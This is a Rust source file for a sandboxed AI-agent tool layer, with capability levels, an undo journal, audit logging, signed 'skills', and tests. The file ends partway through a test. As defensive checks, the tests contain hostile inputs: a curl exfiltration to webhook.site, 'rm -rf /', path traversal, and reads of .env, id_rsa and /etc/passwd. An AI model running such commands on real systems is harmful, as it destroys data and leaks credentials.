//! Инструменты агента (M2): fs_read/fs_list/fs_write/fs_delete поверх
//! FS-песочницы и cli_run поверх allowlist. Каждый инструмент требует
//! уровень capability (Read/Write/Destructive/Network) и scope; мутирующие
//! пишут инверсию в undo-журнал ДО действия.

use crate::audit::Audit;
use crate::caps::CapLevel;
use crate::jail::Jail;
use crate::journal::{Inverse, Journal};
use crate::phishing::{self, Verdict};
use crate::json::Json;
use crate::skills::{Skill, SkillStep, SkillStore, MAX_STEPS};
use dinet_crypto::Ed25519Signer;
use std::path::PathBuf;

/// Какие права нужны инструменту и в каком scope он работает.
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct Need {
    pub level: CapLevel,
}

/// Именованные инструменты MCP-поверхности.
pub const TOOLS: &[(&str, Need, &str)] = &[
    (
        "fs_read",
        Need { level: CapLevel::Read },
        "Прочитать файл в песочнице. Аргументы: path (относительный).",
    ),
    (
        "fs_list",
        Need { level: CapLevel::Read },
        "Список каталога песочницы. Аргументы: path ('' = корень джейла).",
    ),
    (
        "fs_write",
        Need { level: CapLevel::Write },
        "Записать файл (каталоги создаются). Аргументы: path, content. Обратимо: undo.",
    ),
    (
        "fs_delete",
        Need { level: CapLevel::Destructive },
        "Удалить файл. Аргументы: path. Обратимо: содержимое уходит в undo-журнал.",
    ),
    (
        "undo",
        Need { level: CapLevel::Write },
        "Откатить последнее мутирующее действие (fs_write/fs_delete) из undo-журнала.",
    ),
    (
        "audit_tail",
        Need { level: CapLevel::Read },
        "Последние записи аудита (все вызовы инструментов пишутся). Аргументы: n (число, по умолчанию 10).",
    ),
    (
        "skill_save",
        Need { level: CapLevel::Write },
        "Сохранить последовательность вызовов как навык (Evolving Skills). Аргументы: name, steps[{tool,args}].",
    ),
    (
        "skill_run",
        Need { level: CapLevel::Read },
        "Проиграть навык: каждый шаг идёт через те же гейты и аудит. Аргументы: name.",
    ),
    (
        "skill_share",
        Need { level: CapLevel::Read },
        "Экспорт навыка конвертом SKILL_SHARE v1 (подписан автором). Аргументы: name.",
    ),
    (
        "skill_import",
        Need { level: CapLevel::Write },
        "Импорт конверта SKILL_SHARE (подпись автора обязательна; старее — не заменяет). Аргументы: skill (объект или строка-конверт).",
    ),
    (
        "skill_list",
        Need { level: CapLevel::Read },
        "Имена навыков с версиями и счётчиком успехов.",
    ),
    (
        "cli_run",
        Need { level: CapLevel::Network },
        "Запустить разрешённую команду из allowlist. Аргументы: command, args[].",
    ),
];

pub fn need(tool: &str) -> Option<Need> {
    TOOLS.iter().find(|(n, _, _)| *n == tool).map(|(_, nd, _)| *nd)
}

/// Итог действия: текст для content + была ли ошибка уровня инструмента.
#[derive(Debug, PartialEq)]
pub struct ToolOut {
    pub text: String,
    pub is_error: bool,
}

impl ToolOut {
    fn ok(text: String) -> ToolOut {
        ToolOut { text, is_error: false }
    }
    fn err(text: String) -> ToolOut {
        ToolOut { text, is_error: true }
    }
}

/// Мир инструментов: джейл + allowlist + undo-журнал + аудит + навыки + ключ.
pub struct ToolWorld {
    pub jail: Jail,
    pub allow: Vec<AllowRule>,
    pub journal: Journal,
    pub audit: Audit,
    pub skills: SkillStore,
    /// Ключ агента: подписывает навыки (Evolving Skills, SKILL_SHARE).
    pub signer: Ed25519Signer,
    /// Лимит вывода cli (байт) — журнал/чат не рвём.
    pub cli_out_limit: usize,
}

/// Правило allowlist: точное имя или префикс каталога.
#[derive(Debug, Clone, PartialEq)]
pub struct AllowRule {
    /// Путь без аргументов: "ls", "/usr/bin/python3".
    pub cmd: String,
    /// Точный match или префикс пути (компонентный).
    pub exact: bool,
}

impl AllowRule {
    pub fn new(cmd: &str) -> AllowRule {
        AllowRule { cmd: cmd.into(), exact: true }
    }
}

impl ToolWorld {
    pub fn open(dir: &PathBuf, allow: Vec<AllowRule>) -> Result<ToolWorld, String> {
        let jail = Jail::open(dir)?;
        let journal = Journal::open(&dir.join("agent-undo.roi"))?;
        let audit = Audit::open(&dir.join("agent-audit.roi"))?;
        let skills = SkillStore::open(&dir.join("agent-skills.roi"))?;
        // ключ агента: из джейла (создаётся с правами 0600 при первом старте)
        let seed = dinet_crypto::load_or_create_seed(&dir.join("agent-key.seed"))?;
        let signer = Ed25519Signer::from_seed(&seed);
        Ok(ToolWorld { jail, allow, journal, audit, skills, signer, cli_out_limit: 64 * 1024 })
    }

    /// ---------- fs_read ----------
    pub fn fs_read(&self, rel: &str) -> ToolOut {
        let path = match self.jail.resolve(rel) {
            Ok(p) => p,
            Err(e) => return ToolOut::err(e),
        };
        match std::fs::read(&path) {
            Ok(bytes) => ToolOut::ok(String::from_utf8_lossy(&bytes).into_owned()),
            Err(e) => ToolOut::err(format!("{rel:?}: {e}")),
        }
    }

    /// ---------- fs_list ----------
    pub fn fs_list(&self, rel: &str) -> ToolOut {
        let path = if rel.is_empty() {
            self.jail.root().to_path_buf()
        } else {
            match self.jail.resolve(rel) {
                Ok(p) => p,
                Err(e) => return ToolOut::err(e),
            }
        };
        let mut names: Vec<String> = match std::fs::read_dir(&path) {
            Ok(rd) => rd
                .filter_map(|e| e.ok())
                .map(|e| {
                    let t = if e.path().is_dir() { "d" } else { "f" };
                    format!("{t} {}", e.file_name().to_string_lossy())
                })
                .collect(),
            Err(e) => return ToolOut::err(format!("{rel:?}: {e}")),
        };
        names.sort();
        ToolOut::ok(if names.is_empty() {
            "(пусто)".into()
        } else {
            names.join("\n")
        })
    }

    /// ---------- fs_write (обратимо) ----------
    pub fn fs_write(&mut self, rel: &str, content: &[u8]) -> ToolOut {
        // 1) путь валиден
        if let Err(e) = self.jail.resolve_chain(rel) {
            return ToolOut::err(e);
        }
        let path = match self.jail.resolve(rel) {
            Ok(p) => p,
            Err(e) => return ToolOut::err(e),
        };
        // 2) инверсия ДО действия (было содержимое или файла не было)
        let was = std::fs::read(&path).ok();
        let inv = Inverse::Overwrite { rel: rel.to_string(), was };
        if let Err(e) = self.journal.push(inv) {
            return ToolOut::err(format!("undo-журнал не принял действие: {e}"));
        }
        // 3) действие: mkdir -p + write
        let parent = path.parent().map(|p| p.to_path_buf());
        if let Some(p) = parent {
            if let Err(e) = std::fs::create_dir_all(&p) {
                return ToolOut::err(format!("mkdir {p:?}: {e}"));
            }
        }
        match std::fs::write(&path, content) {
            Ok(()) => ToolOut::ok(format!("записано {} байт в {rel}", content.len())),
            Err(e) => ToolOut::err(format!("{rel:?}: {e}")),
        }
    }

    /// ---------- fs_delete (обратимо) ----------
    pub fn fs_delete(&mut self, rel: &str) -> ToolOut {
        let path = match self.jail.resolve(rel) {
            Ok(p) => p,
            Err(e) => return ToolOut::err(e),
        };
        let was = match std::fs::read(&path) {
            Ok(b) => Some(b),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                return ToolOut::err(format!("{rel}: файла нет"))
            }
            Err(e) => return ToolOut::err(format!("{rel:?}: {e}")),
        };
        let inv = Inverse::Overwrite { rel: rel.to_string(), was };
        if let Err(e) = self.journal.push(inv) {
            return ToolOut::err(format!("undo-журнал не принял действие: {e}"));
        }
        match std::fs::remove_file(&path) {
            Ok(()) => ToolOut::ok(format!("{rel} удалён (undo вернёт содержимое)")),
            Err(e) => ToolOut::err(format!("{rel:?}: {e}")),
        }
    }

    /// ---------- undo последнего мутирующего действия ----------
    pub fn undo(&mut self) -> ToolOut {
        let Some(inv) = self.journal.pop() else {
            return ToolOut::err("undo-журнал пуст".into());
        };
        match inv {
            Inverse::Overwrite { rel, was } => {
                let path = match self.jail.resolve(&rel) {
                    Ok(p) => p,
                    Err(e) => return ToolOut::err(format!("undo: путь {rel:?} больше не в джейле: {e}")),
                };
                let res = match was {
                    Some(b) => std::fs::write(&path, &b).map(|_| format!("{rel}: восстановлено {} байт", b.len())),
                    None => std::fs::remove_file(&path).map(|_| format!("{rel}: удалено (до записи файла не было)")),
                };
                match res {
                    Ok(msg) => ToolOut::ok(msg),
                    Err(e) => ToolOut::err(format!("undo {rel:?}: {e}")),
                }
            }
        }
    }

    /// ---------- cli_run (allowlist + NETWORK) ----------
    pub fn cli_run(&self, command: &str, args: &[String]) -> ToolOut {
        let permitted = self.allow.iter().any(|r| {
            r.exact && (r.cmd == command || r.cmd.ends_with(&format!("/{command}"))
                && std::path::Path::new(&r.cmd).is_absolute() == std::path::Path::new(command).is_absolute())
        });
        if !permitted {
            return ToolOut::err(format!(
                "команда {command:?} не в allowlist ({} правил)",
                self.allow.len()
            ));
        }
        // юникс: exec через sh -c запрещён (инъекция); spawn напрямую
        let out = std::process::Command::new(command)
            .args(args)
            .current_dir(self.jail.root())
            .stdin(std::process::Stdio::null())
            .output();
        match out {
            Ok(o) => {
                let mut text = String::new();
                text.push_str(&format!("exit={}", o.status.code().unwrap_or(-1)));
                let so = clip(&String::from_utf8_lossy(&o.stdout), self.cli_out_limit);
                let se = clip(&String::from_utf8_lossy(&o.stderr), self.cli_out_limit);
                if !so.is_empty() {
                    text.push_str("\n--- stdout ---\n");
                    text.push_str(&so);
                }
                if !se.is_empty() {
                    text.push_str("\n--- stderr ---\n");
                    text.push_str(&se);
                }
                ToolOut::ok(text)
            }
            Err(e) => ToolOut::err(format!("{command:?}: {e}")),
        }
    }

    /// Хэндлер всех инструментов: фишинг-фильтр входа → гейт уровня →
    /// действие → аудит. Секрет-пути бракуются ДО открытия даже READ'у.
    pub fn call(&mut self, granted: CapLevel, name: &str, args: &crate::json::Json) -> ToolOut {
        let ts = now_secs();
        // --- фишинг-фильтр входа: секрет-пути (ФС) и опасные cli ---
        let mut flagged = String::new();
        if let Some(p) = arg_str(args, "path") {
            if matches!(name, "fs_read" | "fs_delete" | "fs_write" | "fs_list") {
                if let Some(why) = phishing::secret_path(&p) {
                    let out = ToolOut::err(format!("АНТИ-ФИШИНГ: {why} ({p:?})"));
                    let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
                    return out;
                }
            }
        }
        if name == "cli_run" {
            let mut buf = arg_str(args, "command").unwrap_or_default();
            if let Some(crate::json::Json::Arr(v)) = args.get("args") {
                for a in v {
                    if let Some(s) = a.as_str() {
                        buf.push(' ');
                        buf.push_str(s);
                    }
                }
            }
            match phishing::scan(&buf) {
                Verdict::Blocked(why) => {
                    let out = ToolOut::err(format!("АНТИ-ФИШИНГ: {}", why.join("; ")));
                    let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
                    return out;
                }
                Verdict::Suspicious(why) => {
                    flagged = format!(" ⚠ [SUSPICIOUS: {}]", why.join("; "));
                }
                Verdict::Clean => {}
            }
        }

        let Some(nd) = need(name) else {
            let out = ToolOut::err(format!("неизвестный инструмент {name:?}"));
            let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
            return out;
        };
        if granted < nd.level {
            let out = ToolOut::err(format!(
                "инструмент {name} требует {}, у агента {}",
                nd.level.as_str(),
                granted.as_str()
            ));
            let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
            return out;
        }
        let mut out = match name {
            "fs_read" => {
                let p = arg_str(args, "path");
                match p {
                    Some(p) => self.fs_read(&p),
                    None => ToolOut::err("нужен path".into()),
                }
            }
            "fs_list" => {
                let p = arg_str(args, "path").unwrap_or_default();
                self.fs_list(&p)
            }
            "fs_write" => {
                let (Some(p), Some(c)) = (arg_str(args, "path"), arg_str(args, "content")) else {
                    return ToolOut::err("нужны path и content".into());
                };
                self.fs_write(&p, c.as_bytes())
            }
            "fs_delete" => match arg_str(args, "path") {
                Some(p) => self.fs_delete(&p),
                None => ToolOut::err("нужен path".into()),
            },
            "undo" => self.undo(),
            "audit_tail" => self.audit_tail(arg_int(args, "n").unwrap_or(10)),
            "skill_save" => self.skill_save(arg_str(args, "name"), steps_from(args)),
            "skill_run" => match arg_str(args, "name") {
                Some(n) => self.skill_run(granted, &n),
                None => ToolOut::err("нужен name".into()),
            },
            "skill_share" => match arg_str(args, "name") {
                Some(n) => self.skill_share(&n),
                None => ToolOut::err("нужен name".into()),
            },
            "skill_import" => self.skill_import(args.get("skill")),
            "skill_list" => self.skill_list(),
            "cli_run" => {
                let cmd = match arg_str(args, "command") {
                    Some(c) => c,
                    None => {
                        let out = ToolOut::err("нужен command".into());
                        let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
                        return out;
                    }
                };
                let args_v: Vec<String> = args
                    .get("args")
                    .and_then(|j| match j {
                        crate::json::Json::Arr(v) => Some(
                            v.iter()
                                .filter_map(|x| x.as_str().map(|s| s.to_string()))
                                .collect(),
                        ),
                        _ => None,
                    })
                    .unwrap_or_default();
                self.cli_run(&cmd, &args_v)
            }
            _ => ToolOut::err(format!("неизвестный инструмент {name:?}")),
        };
        // аудит: все вызовы (включая успешные чтения) — DoD «всё в журнале»
        if !flagged.is_empty() {
            out.text.push_str(&flagged);
        }
        let mut summary = out.text.clone();
        if summary.len() > 200 {
            // граница символов UTF-8 (кириллица: байты ≠ символы)
            let mut cut = 200;
            while cut > 0 && !summary.is_char_boundary(cut) {
                cut -= 1;
            }
            summary.truncate(cut);
        }
        let _ = self.audit.log(name, granted.as_str(), !out.is_error, &summary, ts);
        out
    }

    /// Последние n записей аудита (READ-инструмент, саморефлексия).
    pub fn audit_tail(&self, n: usize) -> ToolOut {
        let tail = self.audit.tail(n.clamp(1, 100));
        if tail.is_empty() {
            return ToolOut::ok("(аудит пуст)".into());
        }
        let lines: Vec<String> = tail
            .iter()
            .map(|r| {
                format!(
                    "#{} ts={} {} [{}] {} — {}",
                    r.seq,
                    r.ts,
                    r.tool,
                    r.granted,
                    if r.ok { "ok" } else { "ERR" },
                    r.summary
                )
            })
            .collect();
        ToolOut::ok(lines.join("\n"))
    }

    /// ---------- Evolving Skills ----------
    /// Сохранить последовательность шагов как навык (версия = локальная+1).
    fn skill_save(&mut self, name: Option<String>, steps: Result<Vec<SkillStep>, String>) -> ToolOut {
        let Some(name) = name else {
            return ToolOut::err("нужен name".into());
        };
        let steps = match steps {
            Ok(s) => s,
            Err(e) => return ToolOut::err(e),
        };
        let version = self.skills.get(&name).map(|s| s.version + 1).unwrap_or(1);
        let skill = Skill::mint(&self.signer, &name, version, steps);
        match self.skills.put(&skill) {
            Ok(true) => ToolOut::ok(format!(
                "навык {:?} v{} сохранён (шагов {})",
                name,
                skill.version,
                skill.steps.len()
            )),
            Ok(false) => ToolOut::err(format!("навык {:?}: версия {} не новее локальной", name, version)),
            Err(e) => ToolOut::err(e),
        }
    }

    /// Проиграть навык: КАЖДЫЙ шаг через self.call — гейты, анти-фишинг
    /// и аудит применяются полностью. Успех только если все шаги ok.
    fn skill_run(&mut self, granted: CapLevel, name: &str) -> ToolOut {
        let Some(skill) = self.skills.get(name) else {
            return ToolOut::err(format!("навык {name:?} не найден"));
        };
        let mut lines = Vec::new();
        for (i, step) in skill.steps.iter().enumerate() {
            let out = self.call(granted, &step.tool, &step.args);
            let mut text = out.text;
            if text.len() > 120 {
                let mut cut = 120;
                while cut > 0 && !text.is_char_boundary(cut) {
                    cut -= 1;
                }
                text.truncate(cut);
            }
            let first = text.lines().next().unwrap_or("").to_string();
            if out.is_error {
                return ToolOut::err(format!(
                    "навык {name:?}: шаг {} из {} ({}) НЕ ВЫПОЛНЕН: {}",
                    i + 1,
                    skill.steps.len(),
                    step.tool,
                    first
                ));
            }
            lines.push(format!("{}. {} → {}", i + 1, step.tool, first));
        }
        match self.skills.record_success(name) {
            Ok(n) => lines.push(format!("успехов навыка: {n}")),
            Err(e) => return ToolOut::err(e),
        }
        ToolOut::ok(lines.join("\n"))
    }

    /// Экспорт конвертом SKILL_SHARE v1.
    fn skill_share(&self, name: &str) -> ToolOut {
        match self.skills.get(name) {
            Some(sk) => ToolOut::ok(sk.envelope()),
            None => ToolOut::err(format!("навык {name:?} не найден")),
        }
    }

    /// Импорт конверта: подпись автора обязательна; правило версий.
    fn skill_import(&mut self, skill_arg: Option<&Json>) -> ToolOut {
        let Some(raw) = skill_arg else {
            return ToolOut::err("нужен skill (объект конверта или строка)".into());
        };
        let parsed = match raw {
            Json::Obj(_) => Skill::from_json(raw),
            Json::Str(text) => Skill::from_envelope(text),
            _ => Err("skill — объект или строка-конверт".into()),
        };
        let skill = match parsed {
            Ok(s) => s,
            Err(e) => return ToolOut::err(format!("SKILL_SHARE не принят: {e}")),
        };
        let (name, version) = (skill.name.clone(), skill.version);
        match self.skills.put(&skill) {
            Ok(true) => {
                self.audit
                    .log("skill_import", "", true, &format!("навык {name:?} v{version}"), now_secs())
                    .ok();
                ToolOut::ok(format!("навык {name:?} v{version} импортирован (шагов {})", skill.steps.len()))
            }
            Ok(false) => {
                let local = self.skills.get(&name).map(|s| s.version).unwrap_or(0);
                ToolOut::ok(format!(
                    "навык {name:?} v{version} СТАРЕЕ локальной v{local} — не заменён"
                ))
            }
            Err(e) => ToolOut::err(e),
        }
    }

    /// Список навыков.
    fn skill_list(&self) -> ToolOut {
        let names = self.skills.names();
        if names.is_empty() {
            return ToolOut::ok("(нет навыков)".into());
        }
        let lines: Vec<String> = names
            .iter()
            .filter_map(|n| {
                self.skills.get(n).map(|s| {
                    format!(
                        "{} v{} шагов={} успехов={} автор={}",
                        s.name,
                        s.version,
                        s.steps.len(),
                        s.success,
                        &crate::skills::hex(&s.author)[..16]
                    )
                })
            })
            .collect();
        ToolOut::ok(lines.join("\n"))
    }
}

fn clip(s: &str, limit: usize) -> String {
    if s.len() <= limit {
        s.to_string()
    } else {
        let mut cut = limit;
        while cut > 0 && !s.is_char_boundary(cut) {
            cut -= 1;
        }
        format!("{}…[обрезано]", &s[..cut])
    }
}

fn arg_str(args: &crate::json::Json, key: &str) -> Option<String> {
    args.get(key).and_then(|j| j.as_str()).map(|s| s.to_string())
}

fn arg_int(args: &crate::json::Json, key: &str) -> Option<usize> {
    match args.get(key) {
        Some(crate::json::Json::Int(n)) if *n >= 0 => Some(*n as usize),
        _ => None,
    }
}

/// Шаги навыка из аргументов: steps: [{tool, args}] — tool обязан быть
/// известным инструментом, args — объектом.
fn steps_from(args: &Json) -> Result<Vec<SkillStep>, String> {
    let Some(Json::Arr(items)) = args.get("steps") else {
        return Err("нужен steps (массив {tool, args})".into());
    };
    if items.is_empty() {
        return Err("пустой навык".into());
    }
    if items.len() > MAX_STEPS {
        return Err(format!("шагов {} > {MAX_STEPS}", items.len()));
    }
    let mut out = Vec::new();
    for it in items {
        let tool = it
            .get("tool")
            .and_then(|j| j.as_str())
            .ok_or_else(|| "шаг без tool".to_string())?;
        if need(tool).is_none() {
            return Err(format!("неизвестный инструмент {tool:?} в шаге"));
        }
        let args_v = it.get("args").cloned().unwrap_or(Json::Obj(Vec::new()));
        if !matches!(args_v, Json::Obj(_)) {
            return Err(format!("args шага {tool:?} не объект"));
        }
        out.push(SkillStep { tool: tool.to_string(), args: args_v });
    }
    Ok(out)
}

fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::caps::{CapLevel, CapSet, CapToken};
    use crate::json::parse;
    use dinet_crypto::Ed25519Signer;

    fn tmp_world(tag: &str) -> ToolWorld {
        let dir = std::env::temp_dir().join(format!("dinet-tool-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        ToolWorld::open(&dir, vec![AllowRule::new("ls"), AllowRule::new("echo")])
            .expect("мир")
    }

    fn args_of(src: &str) -> crate::json::Json {
        parse(src).expect("args json")
    }

    #[test]
    fn gating_by_level() {
        let mut w = tmp_world("gate");
        let a = args_of(r#"{"path":"x.txt","content":"hi"}"#);
        // Read не может писать
        let out = w.call(CapLevel::Read, "fs_write", &a);
        assert!(out.is_error, "Read не даёт fs_write");
        // Write может
        let out = w.call(CapLevel::Write, "fs_write", &a);
        assert!(!out.is_error, "{}", out.text);
        // Read не может удалить
        let out = w.call(CapLevel::Read, "fs_delete", &args_of(r#"{"path":"x.txt"}"#));
        assert!(out.is_error);
        // Network не обязателен для fs; Destructive может удалить
        let out = w.call(CapLevel::Destructive, "fs_delete", &args_of(r#"{"path":"x.txt"}"#));
        assert!(!out.is_error, "{}", out.text);
    }

    #[test]
    fn write_read_undo_roundtrip() {
        let mut w = tmp_world("undo");
        w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"d/f.txt","content":"v1"}"#));
        let got = w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"d/f.txt"}"#));
        assert_eq!(got.text, "v1");
        // перезапись поверх существующего
        w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"d/f.txt","content":"v2-longer"}"#));
        assert_eq!(
            w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"d/f.txt"}"#)).text,
            "v2-longer"
        );
        // undo → v1 (undo мутирует — нужен Write)
        assert!(w.call(CapLevel::Write, "undo", &parse("{}").unwrap()).text.contains("восстановлено"));
        assert_eq!(
            w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"d/f.txt"}"#)).text,
            "v1"
        );
        // undo ещё раз → файла не было, remove_file
        let out = w.call(CapLevel::Write, "undo", &parse("{}").unwrap());
        assert!(out.text.contains("удалено"), "{}", out.text);
        assert!(w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"d/f.txt"}"#)).is_error);
    }

    #[test]
    fn delete_then_undo_restores() {
        let mut w = tmp_world("del");
        w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"keep.bin","content":"данные"}"#));
        w.call(CapLevel::Destructive, "fs_delete", &args_of(r#"{"path":"keep.bin"}"#));
        assert!(w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"keep.bin"}"#)).is_error);
        let out = w.call(CapLevel::Write, "undo", &parse("{}").unwrap());
        assert!(out.text.contains("восстановлено"), "{}", out.text);
        assert_eq!(
            w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"keep.bin"}"#)).text,
            "данные"
        );
    }

    #[test]
    fn cli_allowlist_enforced() {
        let mut w = tmp_world("cli");
        let ok = w.call(CapLevel::Network, "cli_run", &args_of(r#"{"command":"echo","args":["привет"]}"#));
        assert!(!ok.is_error, "{}", ok.text);
        assert!(ok.text.contains("привет"), "{}", ok.text);
        let bad = w.call(CapLevel::Network, "cli_run", &args_of(r#"{"command":"rm","args":["-rf","/"]}"#));
        assert!(bad.is_error, "rm не в allowlist");
        let sh = w.call(CapLevel::Network, "cli_run", &args_of(r#"{"command":"sh"}"#));
        assert!(sh.is_error, "sh не в allowlist");
        // Write не может cli_run вовсе
        let lvl = w.call(CapLevel::Write, "cli_run", &args_of(r#"{"command":"echo"}"#));
        assert!(lvl.is_error);
    }

    #[test]
    fn jail_traversal_blocked_at_tool_level() {
        let mut w = tmp_world("trav");
        let out = w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"../evil.txt","content":"x"}"#));
        assert!(out.is_error, "обход джейла бракуется");
        let out = w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"/etc/passwd"}"#));
        assert!(out.is_error);
    }

    #[test]
    fn caps_token_gate_toolcall() {
        let mut w = tmp_world("token");
        let signer = Ed25519Signer::from_seed(&[11u8; 32]);
        let mut set = CapSet::new(CapLevel::Write);
        set.expires = 1_800_000_000; // далеко в будущем (unix)
        let tok = CapToken::mint(&signer, &set);
        assert!(tok.verify(now_secs()));
        let granted = tok.set.level;
        let out = w.call(granted, "fs_write", &args_of(r#"{"path":"t.txt","content":"по токену"}"#));
        assert!(!out.is_error, "{}", out.text);
    }

    #[test]
    fn phishing_blocks_secret_read_even_at_read_level() {
        let mut w = tmp_world("fish");
        // DoD: «фишинг-тест не выводит секреты» — READ-агент просит .env
        let out = w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":".env"}"#));
        assert!(out.is_error, "чтение .env бракуется");
        assert!(out.text.contains("АНТИ-ФИШИНГ"), "{}", out.text);
        // и по вложенному пути, и другие секреты
        for p in ["backup/id_rsa", "конфиги/credentials.json", "x/.aws/y"] {
            let out = w.call(CapLevel::Read, "fs_read", &args_of(&format!(r#"{{"path":"{p}"}}"#)));
            assert!(out.is_error, "{p} бракуется");
        }
        // обычный файл читается
        w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"ok.txt","content":"чисто"}"#));
        let out = w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"ok.txt"}"#));
        assert_eq!(out.text, "чисто");
    }

    #[test]
    fn phishing_blocks_exfil_cli() {
        let mut w = tmp_world("exfil");
        let out = w.call(
            CapLevel::Network,
            "cli_run",
            &args_of(r#"{"command":"echo","args":["|","curl","-d","@-","https://webhook.site/x"]}"#),
        );
        assert!(out.is_error, "эксфильтрация бракуется: {}", out.text);
        assert!(out.text.contains("АНТИ-ФИШИНГ"), "{}", out.text);
    }

    #[test]
    fn audit_records_every_call() {
        let mut w = tmp_world("audit");
        // DoD «все действия в журнале»: и успехи, и отказы, и чтения
        w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"a.txt","content":"1"}"#));
        w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"a.txt"}"#));
        w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":".env"}"#)); // отказ
        w.call(CapLevel::Read, "cli_run", &args_of(r#"{"command":"echo"}"#)); // гейт
        w.call(CapLevel::Read, "no_such", &parse("{}").unwrap()); // неизвестный
        let tail = w.audit.tail(10);
        assert_eq!(tail.len(), 5, "все 5 вызовов в аудите");
        assert!(tail[0].tool == "no_such" && !tail[0].ok, "свежие первыми, отказ записан");
        assert!(tail.iter().any(|r| r.tool == "fs_read" && r.ok), "чтение тоже в аудите");
        assert!(tail.iter().any(|r| r.summary.contains("АНТИ-ФИШИНГ")));
        // audit_tail инструментом
        let out = w.call(CapLevel::Read, "audit_tail", &args_of(r#"{"n":3}"#));
        assert!(out.text.contains("#"), "{}", out.text);
    }

    #[test]
    fn audit_summary_utf8_boundary_no_panic() {
        let mut w = tmp_world("utf8cut");
        // русский текст > 200 байт: truncate обязан резать по границе символов
        let long = "кириллический текст для проверки границы ".repeat(10);
        let out = w.call(
            CapLevel::Write,
            "fs_write",
            &args_of(&format!(r#"{{"path":"длинный.txt","content":"{}"}}"#, long)),
        );
        assert!(!out.is_error, "{}", out.text);
        let out = w.call(CapLevel::Read, "audit_tail", &args_of(r#"{"n":1}"#));
        assert!(!out.is_error, "{}", out.text);
        assert!(out.text.contains("#"), "{}", out.text);
    }

    // ---------- Evolving Skills ----------

    #[test]
    fn skill_save_run_restores_file() {
        let mut w = tmp_world("skillrun");
        // эталон: запись + чтение
        w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"док/заметка.txt","content":"план"}"#));
        assert_eq!(w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"док/заметка.txt"}"#)).text, "план");
        // накопление: те же шаги → навык
        let out = w.call(
            CapLevel::Write,
            "skill_save",
            &args_of(
                r#"{"name":"заметка","steps":[
                    {"tool":"fs_write","args":{"path":"док/заметка.txt","content":"план"}},
                    {"tool":"fs_read","args":{"path":"док/заметка.txt"}}]}"#,
            ),
        );
        assert!(!out.is_error, "{}", out.text);
        assert!(out.text.contains("v1"), "{}", out.text);
        // файл пропал → воспроизведение вернуло
        w.call(CapLevel::Destructive, "fs_delete", &args_of(r#"{"path":"док/заметка.txt"}"#));
        assert!(w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"док/заметка.txt"}"#)).is_error);
        let out = w.call(CapLevel::Destructive, "skill_run", &args_of(r#"{"name":"заметка"}"#));
        assert!(!out.is_error, "{}", out.text);
        assert!(out.text.contains("успехов навыка: 1"), "{}", out.text);
        assert_eq!(
            w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"док/заметка.txt"}"#)).text,
            "план"
        );
        // share → конверт с kind/version/author/sig
        let out = w.call(CapLevel::Read, "skill_share", &args_of(r#"{"name":"заметка"}"#));
        assert!(out.text.contains("SKILL_SHARE"), "{}", out.text);
        // список
        let out = w.call(CapLevel::Read, "skill_list", &args_of("{}"));
        assert!(out.text.contains("заметка v1"), "{}", out.text);
    }

    #[test]
    fn skill_replay_respects_gates() {
        let mut w = tmp_world("skillgate");
        // DoD: навык с шагом-секретом НЕ выводит секрет при replay
        let out = w.call(
            CapLevel::Destructive,
            "skill_save",
            &args_of(r#"{"name":"вредный","steps":[{"tool":"fs_read","args":{"path":".env"}}]}"#),
        );
        assert!(!out.is_error, "сохранить можно, играть нельзя: {}", out.text);
        let out = w.call(CapLevel::Destructive, "skill_run", &args_of(r#"{"name":"вредный"}"#));
        assert!(out.is_error, "анти-фишинг обязан браковать шаг");
        assert!(out.text.contains("АНТИ-ФИШИНГ"), "{}", out.text);
        // счётчик успехов не вырос
        assert_eq!(w.skills.get("вредный").unwrap().success, 0);
        // шаг выше уровня агента: fs_delete требует DESTRUCTIVE, агент WRITE
        let out = w.call(
            CapLevel::Write,
            "skill_save",
            &args_of(r#"{"name":"стиралка","steps":[{"tool":"fs_delete","args":{"path":"x"}}]}"#),
        );
        assert!(!out.is_error, "{}", out.text);
        let out = w.call(CapLevel::Write, "skill_run", &args_of(r#"{"name":"стиралка"}"#));
        assert!(out.is_error, "гейт уровня на шаге обязателен");
        assert!(out.text.contains("требует"), "{}", out.text);
        // неизвестный инструмент в шаге не сохранится вовсе
        let out = w.call(
            CapLevel::Write,
            "skill_save",
            &args_of(r#"{"name":"мусор","steps":[{"tool":"net_fly","args":{}}]}"#),
        );
        assert!(out.is_error, "{}", out.text);
    }

    #[test]
    fn skill_share_import_between_worlds() {
        let mut a = tmp_world("shareA");
        a.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"x.txt","content":"1"}"#));
        a.call(
            CapLevel::Write,
            "skill_save",
            &args_of(r#"{"name":"ритуал","steps":[{"tool":"fs_write","args":{"path":"x.txt","content":"1"}}]}"#),
        );
